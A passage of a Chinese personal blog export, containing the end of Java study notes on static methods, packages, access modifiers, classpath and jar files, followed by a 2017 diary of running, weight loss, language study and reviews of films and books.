class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6eyj2ycaj31f60u0430.jpg" alt="image.png"></p>
<ul>
<li>静态方法<br>用static修饰的方法称为静态方法。<br>Java程序的入口main()也是静态方法。<br>调用实例方法必须通过一个实例变量，而<strong>调用静态方法则不需要实例变量，通过类名就可以调用</strong>。静态方法类似其它编程语言的函数。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticMethod</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Paa.setNumber(<span class="number">99</span>); <span class="comment">//通过类名直接调用静态方法setNumber(int value)</span></span><br><span class="line">        System.out.println(Paa.number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Paa</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> number;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setNumber</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123; <span class="comment">//静态方法setNumber(int value)</span></span><br><span class="line">        number = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>接口的静态字段<br>因为interface是一个纯抽象类，所以它不能定义实例字段。但是，interface是可以有静态字段的，并且静态字段必须为final类型。<br>因为interface的字段只能是<code>public static final</code>类型，所以我们可以把修饰符都去掉。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 编译器会自动加上public static final:</span></span><br><span class="line">    <span class="keyword">int</span> MALE = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> FEMALE = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3>Java编译器最终编译出的.class文件只使用完整类名，因此，在代码中，当编译器遇到一个class名称时：</li>
</ul>
<ol>
<li>如果是完整类名，就直接根据完整类名查找这个class；</li>
<li>如果是简单类名，按下面的顺序依次查找：<br> 查找当前package是否存在这个class；<br> 查找import的包是否包含这个class；<br> 查找java.lang包是否包含这个class。</li>
<li>如果按照上面的规则还无法确定类名，则编译报错。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.text.Format;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">     java.util.List list; <span class="comment">// ok，使用完整类名 -&gt; java.util.List</span></span><br><span class="line">     Format format = <span class="keyword">null</span>; <span class="comment">// ok，使用import的类 -&gt; java.text.Format</span></span><br><span class="line">     String s = <span class="string">&quot;hi&quot;</span>; <span class="comment">// ok，使用java.lang包的String -&gt; java.lang.String</span></span><br><span class="line">     System.out.println(s); <span class="comment">// ok，使用java.lang包的System -&gt; java.lang.System</span></span><br><span class="line">     MessageFormat mf = <span class="keyword">null</span>; <span class="comment">// 编译错误：无法找到MessageFormat: MessageFormat cannot be resolved to a type</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6g2n7pjaj31f60u0n1o.jpg" alt="image.png"><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3>Java内建的访问权限包括public、protected、private和package权限；<br>Java在方法内部定义的变量是局部变量，局部变量的作用域从变量声明开始，到一个块结束；<br>final修饰符不是访问权限，它可以修饰class、field和method；<br>一个.java文件只能包含一个public类，但可以包含多个非public类。</li>
</ol>
<ul>
<li>public<br>定义为public的class、interface可以被其他任何类访问。<br>定义为public的field、method可以被其他类访问，前提是首先有访问class的权限。</li>
<li>private<br>定义为private的field、method无法被其他类访问。<br>private访问权限被限定在class的内部，而且与方法声明顺序无关。推荐把private方法放到后面，因为public方法定义了类对外提供的功能，阅读代码的时候，应该先关注public方法。</li>
<li>protected<br>protected作用于继承关系。定义为protected的字段和方法可以被子类访问，以及子类的子类。</li>
<li>package<br>包作用域是指一个类允许访问同一个package的没有public、private修饰的class，以及没有public、protected、private修饰的字段和方法。<br>只要在同一个包，就可以访问package权限的class、field和method。<br>包没有父子关系，com.apache和com.apache.abc是不同的包。</li>
<li>局部变量<br>在方法内部定义的变量称为局部变量，局部变量作用域从变量声明处开始到对应的块结束。方法参数也是局部变量。</li>
<li>final<br>用final修饰class可以阻止被继承。<br>用final修饰method可以阻止被子类覆写。<br>用final修饰field可以阻止被重新赋值。<br>用final修饰局部变量可以阻止被重新赋值。<h3 id="classpath和jar"><a href="#classpath和jar" class="headerlink" title="classpath和jar"></a>classpath和jar</h3></li>
<li>classpath<br>classpath是JVM用到的一个环境变量，它用来指示JVM如何搜索class。<br>classpath的设定方法有两种：</li>
</ul>
<ol>
<li>在系统环境变量中设置classpath环境变量，不推荐；</li>
<li>在启动JVM时设置classpath变量，推荐。<br> 实际上就是给java命令传入-classpath或-cp参数。<br> <code>java -cp .;C:\work\project1\bin;C:\shared abc.xyz.Hello</code></li>
</ol>
<ul>
<li>jar包<br>把package组织的目录层级，以及各个目录下的所有文件（包括.class文件和其他文件）都打成一个jar文件，方便下载和使用。<br>jar包实际上就是一个zip格式的压缩文件，而jar包相当于目录。如果我们要执行一个jar包的class，就可以把jar包放到classpath中。<br>jar包如何创建？<br>因为jar包就是zip包，所以，直接在资源管理器中，找到正确的目录，点击右键，在弹出的快捷菜单中选择“发送到”，“压缩(zipped)文件夹”，就制作了一个zip文件。然后，把后缀从.zip改为.jar，一个jar包就创建成功。<br>Java社区提供了大量的开源构建工具，例如Maven，可以非常方便地创建jar包。<h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3>所以，jar只是用于存放class的容器，它并不关心class之间的依赖。<br>从Java 9开始引入的模块，主要是为了解决“依赖”这个问题。如果a.jar必须依赖另一个b.jar才能运行，那我们应该给a.jar加点说明啥的，让程序在编译和运行的时候能自动定位到b.jar，这种<strong>自带“依赖关系”的class容器就是模块</strong>。</li>
<li>编写模块</li>
<li>运行模块</li>
<li>打包JRE</li>
<li>访问权限<br>模块进一步隔离了代码的访问权限。<br>具体操作明天继续……这个部分得好好消化，信息量略大……</li>
</ul>
]]></content>
      <categories>
        <category>java学习</category>
        <category>基础知识大漫灌</category>
      </categories>
      <tags>
        <tag>java编程</tag>
        <tag>面向对象编程</tag>
      </tags>
  </entry>
  <entry>
    <title>想些啥</title>
    <url>//posts/ZH-CN/Think_About.html</url>
    <content><![CDATA[<p>总要留下些什么，才不枉来到这个世界上。我把曾经记录的细碎片段，都搬到这里。很多文字，都加了特有的密码，甚至有很多密码我自己也忘了。现在看到很多记录，自己也觉得无厘头，就成了永远无法解密的档案。就按时间线整理我至今短暂又漫长的心的旅程吧，这个整理的过程，我也不知道自己会怎么看待自己，但是我觉得有必要不带偏见地认识一下过去的自己。</p>
<p><escape> <span id="more"></span></escape></p>
<blockquote>
<p>2017-06-20 14:06:09<br>岁月，是把刀。</p>
</blockquote>
<blockquote>
<p>2017-07-07 14:26:41<br>原来我也会没有安全感，也会害怕，以前喜欢流浪，现在却希望安稳。</p>
</blockquote>
<blockquote>
<p>2017-07-19 23:11:58<br>越来越没有安全感。</p>
</blockquote>
<blockquote>
<p>2017-07-20 22:51:35<br>跟这群小孩玩水果蹲，结果最后是自己双腿发酸，看来是缺少锻炼啊。喜欢小孩子的肆无忌惮和无所顾忌。</p>
</blockquote>
<blockquote>
<p>2017-07-21 23:14:29<br>有音乐，一切都好。</p>
</blockquote>
<blockquote>
<p>2017-07-28 23:08:09<br>慢慢来，不着急。</p>
</blockquote>
<blockquote>
<p>2017-08-11 11:15:00<br>归家，虽然旅途有点难熬，但是心中的那份期待很美好。</p>
</blockquote>
<blockquote>
<p>2017-09-08 20:18:53<br>谁喜欢累啊，谁不想安稳</p>
</blockquote>
<blockquote>
<p>2017-10-04 19:28:21<br>Hold On, Pain Ends.</p>
</blockquote>
<blockquote>
<p>2017-10-04 19:35:17<br>我有我的原则，不喜欢任何形式的绑架。换位思考是站在对方的角度想问题，而不是把自己的想法强加于人。还有，不喜欢拖泥带水，不喜欢粘人的relationship。我很懒，不喜欢去打理那些复杂的东西。</p>
</blockquote>
<blockquote>
<p>2017-10-09 09:01:44<br>超级不喜欢喜欢偷窥隐私的大嘴巴</p>
</blockquote>
<blockquote>
<p>2017-10-11 22:56:48<br>不是说金秋十月吗？我要金色的秋天！</p>
</blockquote>
<blockquote>
<p>2017-10-13 14:18:54<br>奇迹不会在短时间内发生，坚持下去，一定要瘦啊</p>
</blockquote>
<blockquote>
<p>2017-10-13 20:26:36<br>第二十天，从今天开始在这儿打卡</p>
</blockquote>
<blockquote>
<p>2017-10-13 22:45:37<br>爸爸妈妈的电话号码永远不需要备注，从小就已烂熟于心。</p>
</blockquote>
<blockquote>
<p>2017-10-14 11:08:39<br>昨天突然收到了上学期参加作文比赛的证书，还是郭老师托同学带给我的，虽然只是个优胜奖。才得知郭老师没在我学校了，想想挺怀念的，两年的学习英语的时光匆匆而过，郭老师特别博学，很遗憾没能从老师那多学一点东西。上学期参加英语竞赛和作文比赛老师也费了很多心思，还专程让同学带资料书给我，现在想起这些点点滴滴，禁不住觉得感动。以后还会遇到这样的好老师吗？大概像郭老师这样的没有了。他还曾说过让我考他的研究生，无奈家里经济条件不好，我不打算考研究生了。只有现在努力多学英语才对得起他的期望。学习是永无止境的，加油吧，***，相信自己是独一无二。还有很多对你抱有希望的人，不要放弃自己。</p>
</blockquote>
<blockquote>
<p>2017-10-14 21:01:55<br>第二十一天，今天有点特别，来跑步的时候就下雨，雨势渐大，在楼梯角躲了一会儿雨，几分钟后雨便小了。为了减肥，就在雨中跑一回吧。所幸跑步途中没有再下大雨。即将跑至三十分钟时，却又下起豆大的雨珠，啪啪打在身上脸上。看来是有始有终啊，来时大雨，去时也大雨。</p>
</blockquote>
<blockquote>
<p>2017-10-14 21:18:12<br>下天桥竟然滑了一跤，还好是晚上，还好周围没人，不然糗大了。</p>
</blockquote>
<blockquote>
<p>2017-10-15 23:26:50<br>第二十二天，今天简直不能再充实了。全程无隙。坐到末班车的心情不能再幸福，善良的人真多，卖枣的大叔热心，碰到的陌生阿姨也热心，谢谢，真的很感谢。还有末班车的公交司机也很热心，不然我要在黑夜中彷徨了。因为第一次坐p45，以为到团结公交站下车，其实是在宝华村7组站下车，记住啦。今天真的很幸运很幸运，第一次觉得自己是上帝的宠儿。还有一个小确幸，十一点竟然还有热水，洗了个舒服的热水澡。差点忘了正题，跑了5公里哦。赶在操场关闭的一瞬间跑完。今天有太多刚刚好。现在才睡觉，好梦。明天加油。</p>
</blockquote>
<blockquote>
<p>2017-10-16 22:43:28<br>第二十三天。速度提高了，跑5公里还真的有点累，但是跑完之后就会有成就感。这几天就坚持每天5公里吧。星期天挑战线上10公里。今天跑步的人挺多的诶。最近喜欢听张信哲。他的嗓音特别迷人，温柔，唱到人心里去，听久了会沉迷，只有晚上听会儿，然后进入梦乡。</p>
</blockquote>
<blockquote>
<p>2017-10-17 22:49:24<br>第二十四天。完成5公里，比昨天轻松一点。看来已经渐渐适应了这个强度。</p>
</blockquote>
<blockquote>
<p>2017-10-18 21:34:02<br>顾影自怜最可悲，所以不愿陷入。</p>
</blockquote>
<blockquote>
<p>2017-10-18 21:40:12<br>第二十五天。平平淡淡跑完5公里，跑完后按摩腿，看到腿上的赘肉挺心烦的。毕竟是堆了10多年的肉，哪能轻易说甩掉就甩掉。多点耐心吧，肉是一点一点堆的，减还是得一点一点的减。人们常说，当你感到不能坚持下去的时候，往往就离目标不远了。最近在看三毛，感觉自己跟她在某种程度上有些相似。同是喜欢流浪和自由，但身在异乡，乡愁也随之而来。</p>
</blockquote>
<blockquote>
<p>2017-10-19 19:08:31<br>做人总是要留些余地的，世道变幻，风云莫测。</p>
</blockquote>
<blockquote>
<p>2017-10-19 22:06:53<br>第二十六天。心情就像今夜的迷雾，还是慢慢地，跑完5公里，先不管其他的，瘦下来再说，减肥都做不到，你还敢说你要实现什么理想。不想任人宰割，被人喝血吃肉，就先从减肥做起。</p>
</blockquote>
<blockquote>
<p>2017-10-20 12:20:05<br>总是纠结明天就永远过不好当下</p>
</blockquote>
<blockquote>
<p>2017-10-20 23:40:24<br>第二十七天。发现一个跑步转移注意力的秘诀，数数，循环数，从一数到一百，跑一圈要数4个一百（天桥那边绕着食堂的一圈跑）。好像有路灯情节吧，在凄清冷淡的夜看到昏暗闪烁的路灯，有种说不出的美，尤其是天桥两旁的路灯。现在很晚了。学了两小时日语，这学期差不多搁置了一个月没学，以前是因为宽带没连起，现在连起宽带了，就不要再找理由了吧。现在对这句话感受很深。时间总是有的，如果你真的很想做那件事。说到时间，就像拥有的财富，怎么使用就是大智慧了。时间是世界上最公平的东西了，经营好自己的时间，也就是在用心经营人生。</p>
</blockquote>
<blockquote>
<p>2017-10-21 22:12:44<br>第二十八天。慢跑5公里，原来不只我一个人绕着食堂跑，真是，周五周六操场怎么就不开门呢。坚持下去吧，肥肉正在悄悄溜走。三十天的时候去就去称体重。晚上还得早点睡啊，昨晚睡晚了，加上对面那栋楼有个女的大半夜对着电话吵，早上起晚了，风风火火跑去坐车，意料之中，迟到了3分钟。就说这么多吧，sleep tight.</p>
</blockquote>
<blockquote>
<p>2017-10-22 22:32:00<br>第二十八.九天。其实今天没跑步。下班回来已经很晚也很累了。所以还是趁现在的黄金时段，好好锻炼吧。惊险，又是刚好在黑夜里踩上末班车的点，谢天谢地啊。所以，今天的10公里就明天来完成吧。嗓子痛，看来我的身体器官反应都是慢半拍啊，昨天给小学生上课说话用力过度，今天才开始嗓子疼。以前是头一天剧烈运动，第二天肌肉才反应过来开始疼。今天看到一个长得像朴海镇的男生诶，帅啊。所以减肥又有动力了。睡啦，晚安，做个好梦。</p>
</blockquote>
<blockquote>
<p>2017-10-23 22:39:49<br>第二十九天。跑完10公里，一句话，风雨兼程。现在太晚了，睡觉。明天加油。希望明天腿不要疼。嗓子差不多恢复了。</p>
</blockquote>
<blockquote>
<p>2017-10-24 22:46:48<br>第二十九.九天。今夜大雨，未跑。看射雕英雄传，入迷了。好了，睡了吧。</p>
</blockquote>
<blockquote>
<p>2017-10-25 23:59:48<br>第三十天。5公里。睡了。明天就上称，紧张啊。</p>
</blockquote>
<blockquote>
<p>2017-10-26 19:08:25<br>称了体重，居然…还是那么重52.7kg.长肥容易减肥难哪。再来一个月，下个月一定要有点起色啊。我都已经控制自己的嘴，也迈开腿了，就不要再让我失望了吧。今天又剁手了。好像每个月都有那么一两天很想剁手。</p>
</blockquote>
<blockquote>
<p>2017-10-26 23:48:48<br>第三十一天。5公里。雾霾好严重，嗓子不舒服。</p>
</blockquote>
<blockquote>
<p>2017-10-27 22:39:08<br>第三十二天。5公里。看了翻滚吧阿信。想哭的时候就倒立，这样眼泪就不会流出来，在最艰难的时候，阿信靠这句话挺过去了。时间总是有的。凡事都有过程，循序渐进。终于学到日语第七课了。继续加油。晚安了。</p>
</blockquote>
<blockquote>
<p>2017-10-28 22:11:35<br>第三十二.九天。身体不舒服，没去吸霾跑步。嗓子超级不舒服。</p>
</blockquote>
<blockquote>
<p>2017-10-29 22:53:46<br>第三十三天。6公里。感觉自己瘦了。哈哈哈哈，开心。今天完全没压力，轻轻松松6公里。有氧无氧结合，跑前拉伸很重要啊，我的左腿就是例子，一定是跑10公里那天没注意拉伸，肌肉拉伤了。跑完步跳个郑多燕的小红帽。还有，从今天开始，练习美丽芭蕾天鹅臂。睡了，晚安好梦。</p>
</blockquote>
<blockquote>
<p>2017-10-30 13:29:13<br>相信坚持的力量。小目标：2018半马。</p>
</blockquote>
<blockquote>
<p>2017-10-30 22:28:52<br>第三十四天。小红帽，天鹅臂，6公里。想从废鹅变成天鹅真不容易啊，手臂又酸又痛。时间不早了，晚安好梦。</p>
</blockquote>
<blockquote>
<p>2017-10-31 22:35:53<br>第三十五天。小红帽，天鹅臂，6公里。改变的过程的确很痛苦，但是能改变你的只有你自己。晚安，好梦。</p>
</blockquote>
<blockquote>
<p>2017-11-01 22:50:41<br>第三十六天。zumba，天鹅臂，6公里。zumba很有动感，舞步较简单，就是速度要快的话需要多加练习，随音乐舞蹈的感觉很棒。睡啦，晚安。</p>
</blockquote>
<blockquote>
<p>2017-11-02 22:46:18<br>第三十七天。zumba，天鹅臂（全程同步，渐渐适应了这个强度），6公里。陈意涵有她的8公里哲学。当然每个人的瓶颈不同，只要跨过那道坎，就会轻松很多。刚开始的三3公里我会感到很吃力，但是过了之后，就渐渐享受跑步的快乐。只要不跑岔气，过了瓶颈，跑多远就是意志的事了。晚安，睡了，明天六节微波。</p>
</blockquote>
<blockquote>
<p>2017-11-03 23:43:01<br>第三十八天。zumba，天鹅臂。今天没去跑步。晚安啦。</p>
</blockquote>
<blockquote>
<p>2017-11-04 22:45:27<br>第三十九天。zmba，真的很好玩，越跳越开心。</p>
</blockquote>
<blockquote>
<p>2017-11-05 22:38:44<br>在寝室懒了一天。也没做运动。下周继续吧。看了小s主演的吃吃的爱。好像人都是在得知时间的紧迫之后才会想加紧完成梦想。顺便又看了小s和蔡康永主持的康熙来了，说话风格真是幽默啊，简直是完美搭档。</p>
</blockquote>
<blockquote>
<p>2017-11-05 22:41:30<br>脸是会骗人的，但心不会骗人。</p>
</blockquote>
<blockquote>
<p>2017-11-06 08:50:52<br>昨晚睡了很久没睡着，灯光太刺眼，还好在网上买的床帘快到了。一直翻来覆去，脑子还是不停在思考，像是不听使唤一样。下面就是昨天晚上的胡思乱想。关于教育。一个复杂的话题，我只是用自己浅薄的认知来思考这个问题。我们从小受到的教育就是圣贤教育，老师教我们要成为某某某一样的人，要学习孔融让梨，要舍己为人，无私奉献。总之，这种道德思想便深深地扎根于心。但是我们在学校学习的东西都有太多的假设，太多的理想状态。一旦脱离了乌托邦式的环境条件，就很容易心理扭曲。舍弃了自我，还是个健全的灵魂吗？不过是个空壳罢了。学校对学生（小学生除外）的作息时间安排是真的很没有人性化的，于健康而言。每天高负荷的学习只会让学生产生厌倦心理。教育的关键是以人为本，是为国家打造栋梁之才的。至少很多学生写作文都写过类似的话，要好好学习，成为国家栋梁。当然这里的学习，指的是学习课本知识，追求学习成绩。但是学习知识就够了吗？如果没有强健的体魄，学习好了，还是废材啊。因为这种栋梁的寿命短啊。再有就是军训，强烈反对学校军训。军训的目的何在？官方有很多理由，但不免显得冠冕堂皇。锻炼学生的意志和纪律，强身健体，云云。真的是这样吗？反而是对身体的摧残，并不是每个人都适合那样高强度的训练，学生的体质如何，学校其实不会不清楚。看体育课是怎么上的就知道了。本来缺乏锻炼，突然来个高强度的军训，会出现什么结果？可想而知。况且有些训练项目对学生而言是非人性化的，尤其是女生。比如女生来例假，教官任然会训练大家的反应能力，听口令坐在地上，下雨天也如此，根本不会管这样做会不会对学生的健康造成影响。烈日下依然进行军训，也不管学生会不会中暑，反正中暑了有医务室。这些以牺牲健康为代价的意志力和体格训练，我不认为是明智的。锻炼的目的难道不是为了健康吗？为什么反而要打着健康的旗号来消耗健康呢？健康是第一的，我始终坚信。身体是革命的本钱，这句话我也始终坚信。凡是以牺牲健康为代价的事，我不愿意做。</p>
</blockquote>
<blockquote>
<p>2017-11-06 22:42:48<br>第四十天。zumba，9公里。不说了，在雾霾中跑的，心酸得很，好担心我的呼吸道。晚安吧。</p>
</blockquote>
<blockquote>
<p>2017-11-07 22:50:33<br>第四十一天。zumba，看评论差点笑岔气，原来不只我一个人觉得这个舞跳了开心。7公里，最后一个从操场出去。睡了，晚安。</p>
</blockquote>
<blockquote>
<p>2017-11-08 23:05:35<br>没运动。看了一晚上奇葩说，好看！很有思辨性，寇乃馨，颜如晶，马薇薇，范湉湉都好厉害，还有肖骁也很不错，虽然看起娘气，但是台风很犀利。</p>
</blockquote>
<blockquote>
<p>2017-11-09 22:45:26<br>第四十二天。zumba，基础动作终于学完，再练习几天就跟着一起连贯地跳，感受群魔乱舞的氛围。11公里，小突破，跨过了10公里的坎。这次腿部终于没有酸痛感了。睡啦，晚安。</p>
</blockquote>
<blockquote>
<p>2017-11-10 22:57:26<br>第四十三天。zumba，跳了就根本停不下来！很喜欢这种原始的节奏感，也跟着舞曲和视频一起群魔乱舞，好玩啊。看“晓说”，看高晓松的脱口秀真的很涨知识。晚安，明天早起。</p>
</blockquote>
<blockquote>
<p>2017-11-11 22:39:23<br>继续“晓说”。</p>
</blockquote>
<blockquote>
<p>2017-11-12 22:42:32<br>再一次，赶上末班车。一个字，困！困得不行。睡了，晚安。明天又是新的一天。</p>
</blockquote>
<blockquote>
<p>2017-11-13 22:42:48<br>第四十四天。zumba，8公里。相信时间的力量。晚安。</p>
</blockquote>
<blockquote>
<p>2017-11-14 22:47:39<br>第四十五天。6公里。看了很多李银河的博客文章，人生很无奈，但是快乐永远是最终的追求。晚安。</p>
</blockquote>
<blockquote>
<p>2017-11-15 22:43:03<br>看“晓说”。知识难道不是要用有趣轻松的方式来传授吗？我一直认为，老师不是随随便便一个人能胜任的，老师身上肩负的责任以及对学生的影响十分巨大。然而某些教师根本没尽到传授技能这一基本必要的责任，更不要说传授知识了。照本宣科的老师不在少数，是完全把学生当成傻瓜了吗？高等教育就是这种模式？把学生的主观能动性置于何地？资本家好歹也要有点资本家的良心吧，对消费者来说，价格和价值完全不对等。</p>
</blockquote>
<blockquote>
<p>2017-11-16 23:28:21<br>晓说第一季完结。</p>
</blockquote>
<blockquote>
<p>2017-11-19 22:49:23<br>futurelearn还不错，坚持。似水柔情居然写的是男同志，对这些人多了一点了解。晚安。</p>
</blockquote>
<blockquote>
<p>2017-11-20 23:30:29<br>第四十六天。7公里。</p>
</blockquote>
<blockquote>
<p>2017-11-21 22:46:17<br>第四十七天。4公里。继续坚持。不要雷声大雨点小。晚安。</p>
</blockquote>
<blockquote>
<p>2017-11-22 22:14:24<br>第四十八天。10公里。</p>
</blockquote>
<blockquote>
<p>2017-11-22 22:14:26<br>第四十八天。10公里。</p>
</blockquote>
<blockquote>
<p>2017-11-23 22:49:55<br>第四十九天。18公里。脚踝磨起泡了，下次就不穿露脚踝的船袜了吧。晚安。</p>
</blockquote>
<blockquote>
<p>2017-11-24 22:02:32<br>王安忆写的屋顶上的童话好吸引人。</p>
</blockquote>
<blockquote>
<p>2017-11-25 23:55:17<br>看剧太容易上瘾。</p>
</blockquote>
<blockquote>
<p>2017-11-26 12:02:14<br>霸王别姬。文化大革命实在可怕，人性扭曲，把政治强加给老百姓，人人自保，互相批斗，竟然与爱的人划清界限。艺术是纯粹的，掺了杂质就不叫艺术了。困兽冲破牢笼的瞬间是不可阻挡的，不管它之前有多驯服。</p>
</blockquote>
<blockquote>
<p>2017-11-26 22:42:50<br>第五十天。17公里。</p>
</blockquote>
<blockquote>
<p>2017-11-27 22:20:08<br>第五十一天。8公里。</p>
</blockquote>
<blockquote>
<p>2017-11-28 22:42:53<br>第五十二天。8公里。真羡慕三毛和荷西的爱情。一起流浪，相依相守。</p>
</blockquote>
<blockquote>
<p>2017-11-30 22:22:08<br>感冒第二天。周六之前赶紧恢复啊，不然又得恶化。</p>
</blockquote>
<blockquote>
<p>2017-12-01 22:48:27<br>去公立卫生院拿了药，好像效果是比较好。看完穿普拉达的女王。女主真有魅力。</p>
</blockquote>
<blockquote>
<p>2017-12-02 22:11:40<br>蒂凡尼的早餐结局感人啊，holly这匹野马终于找到属于她的那片草原，paul从计程车下去的那一刻好帅，那番言语直击电影主题，同时彻底走进holly的世界。</p>
</blockquote>
<blockquote>
<p>2017-12-02 22:28:48<br>moon river is so magic a song.</p>
</blockquote>
<blockquote>
<p>2017-12-03 20:56:25<br>第五十三天。3公里。继续加油吧。</p>
</blockquote>
<blockquote>
<p>2017-12-04 22:46:16<br>第五十四天。3公里。</p>
</blockquote>
<blockquote>
<p>2017-12-05 21:19:35<br>五十五天。3公里。</p>
</blockquote>
<blockquote>
<p>2017-12-06 22:59:10<br>第五十六天。3公里。向曾经傻叉的自己说再见。</p>
</blockquote>
<blockquote>
<p>2017-12-08 19:14:51<br>I always believe that everyone has magical power. But until now, I think my life is still a mess. No direction, also no ambition. And I often make great plans when I was too excited, so these plans finally become homeless. All things get so rediculous and I even cannot control my mouth, just eat those junk food. Maybe, it’s too hard for me to lose weight. I know it clearly that I can easily be upset when I feel so lonely, it’s a feeling like nobody can understand you.</p>
</blockquote>
<blockquote>
<p>2017-12-08 19:17:45<br>Ok, now, step forward. Don’t forget challenging yourself. You , are not a loser. From now on, be what you wanna be and try to grow up.</p>
</blockquote>
<blockquote>
<p>2017-12-09 12:48:45<br>I don’t like to tag others, and I don’t like to be tagged, too.</p>
</blockquote>
<blockquote>
<p>2017-12-09 22:01:18<br>教父。对黑手党有了一点点了解，要经营一个家族的产业背负的责任太巨大，Mike成为教父后又会发生些什么故事。从Mike第一次拿起手枪杀人开始，就注定一生不会太平，Vito中枪负伤后，他就必须扛起肩上的重任。成为Don之后，成为godfather之后，人生轨迹又将发生什么变化。</p>
</blockquote>
<blockquote>
<p>2017-12-10 23:01:40<br>sleep now. don’t think too much about future. </p>
</blockquote>
<blockquote>
<p>2017-12-11 22:49:29<br>教父终结。mafia在mike看来是家族传统，他一心想使corleone家族产业合法化。太多的罪恶，无论黑道白道。mike扛了三个十字架在身上，他在神父面前做confessions，在讲到自己亲自下令杀了亲哥哥fredo的时候泣不成声，可见他内心的折磨以及在此倾诉之前的无限孤独。背叛了kay，到西西</p>
</blockquote>
<blockquote>
<p>2017-12-11 22:52:17<br>三体是部脑洞大开的科幻小说，小说中有很多科学知识，包括许多通信方面的知识。作者不愧是工程师，而且是位想像力丰富，文笔生动的工程师。期待电影版三体。</p>
</blockquote>
<blockquote>
<p>2017-12-11 23:05:31<br>破产姐妹第一季终结。max的笑太有魅力了，以前就对她的笑容有种熟悉感，今天终于想起来了，像赵薇，尤其是演小燕子时候的赵薇，那双水灵灵的大眼睛，还有机具幽默意味的笑。max的面部表情拿捏的相当好，将角色演得出神入化。最后一集，max和caroline盛装混入martha stewart的party，在厕所偶遇martha stewart时，martha的那番话真让人感动。take every chance. 对啊，如果真的很想把cupcake business做大，就算在厕所推销cupcake又何妨，because chance never wait for anyone.</p>
</blockquote>
<blockquote>
<p>2017-12-12 21:26:48<br>射雕英雄传。目前看过的金庸小说里，最喜欢的男主就是郭靖。他一心只喜欢黄蓉，专情至深。黄蓉也真是个有趣的姑娘，好想吃她做的菜啊，隔着书页都能闻到美食的香味。</p>
</blockquote>
<blockquote>
<p>2017-12-13 23:16:19<br>呼啸山庄电影看了，与原著还是有些不同。电影将希斯克利夫美化了，看小说的时候，对希斯克利夫只有恐惧，其人格可怕，但电影中把他性格的古怪表现得不是太到位。但他对凯西的爱是绝对真实感人，甚至到了极端境界。凯西也爱他，因为他就是自己的灵魂，但是现实还是没让她嫁给一无所有的希斯克利夫，而是选择了英俊富有的埃德加林顿（虽然个人觉得电影中的希斯克利夫更帅）。电影中希斯克利夫和凯西在‘城堡’定情的场景好像原著中并没有表现，还有他们翻墙去偷看林顿家办的舞会原著被狗咬伤原著也没提到。不过电影中如此叙述也为情节增添了浪漫元素。看原著喜欢林顿，看电影喜欢希斯克利夫。女主长得很美，有种东方美，有lady气质。</p>
</blockquote>
<blockquote>
<p>2017-12-13 23:18:33<br>射雕英雄传。一口气看到十六回，情节紧凑，实在吸引人啊。真想去桃花岛看看，金庸说他去过桃花岛，岛上的石头上真的有桃花的图案。</p>
</blockquote>
<blockquote>
<p>2017-12-14 22:53:01<br>看了几米的书，好想看他画的那些绘本。记得初中的时候就在书店看到他的绘本，封面特好看，非常吸引人，只不过那时候没钱买，隔了六七年终于读到几米的文字，也算圆了那时的梦吧。有图画的书看着很舒服。</p>
</blockquote>
<blockquote>
<p>2017-12-14 22:56:54<br>某高级工程师的讲座竟然是这个样子，还好带了本书，不然两个半小时真有点难熬，结束后双脚已经冻僵了。不怪观众不理啊，首先ppt就让人感到无聊。也或许专研技术的人才在语言表达上普遍都比较无力吧。</p>
</blockquote>
<blockquote>
<p>2017-12-15 21:58:11<br>煎饼侠&amp;缝纫机乐队。这两部大鹏导演并主演的电影都让人笑中带泪，对底层的艰苦奋斗刻画得很到位。大鹏在这两部电影表现的主题都是理想，即使只有一丝丝希望甚至希望渺茫，也坚持完成心中的梦，不管是英雄梦还是音乐梦，都不能因为金钱和世俗而破灭。梦想不容轻蔑，它是一个人活下去的信仰。煎饼侠没钱依然不放弃英雄梦，甚至做白事主持，在宴上忍受侮辱，喝一杯酒拿一万块。因为那时，钱可以实现梦想，他可以为了梦想放下尊严。胡亮的乐队梦，在乐队解散后，生活没了生气，仅仅维持生存而已。乐队解散前，他白天搞乐队，晚上开拖拉机、修车，但是那时的生活充满干劲。所以没有梦想的生活是苍白无力的。</p>
</blockquote>
<blockquote>
<p>2017-12-16 22:41:43<br>不做不喜欢的事，不答应办不到的事。</p>
</blockquote>
<blockquote>
